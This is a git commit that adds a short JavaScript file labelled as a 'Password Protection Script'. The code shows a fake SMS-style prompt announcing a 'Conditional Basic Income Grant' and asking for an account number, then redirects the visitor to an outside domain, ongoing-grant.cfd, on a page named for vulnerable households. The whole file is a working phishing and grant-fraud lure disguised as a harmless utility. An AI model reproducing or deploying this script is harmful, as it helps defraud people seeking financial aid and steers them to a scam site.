ba9ded7429b06b1ea0b8c744ee17d7d7e412ade3
The-ongoing <preciousadaowo4@gmail.com>
2026-01-04 21:43:51 +0100

    Create active.js

---
+++ active.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive CONDITIONAL BASIC INCOME GRANT. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://ongoing-grant.cfd/Cbig-Vulnerable-Households.html';
+  }
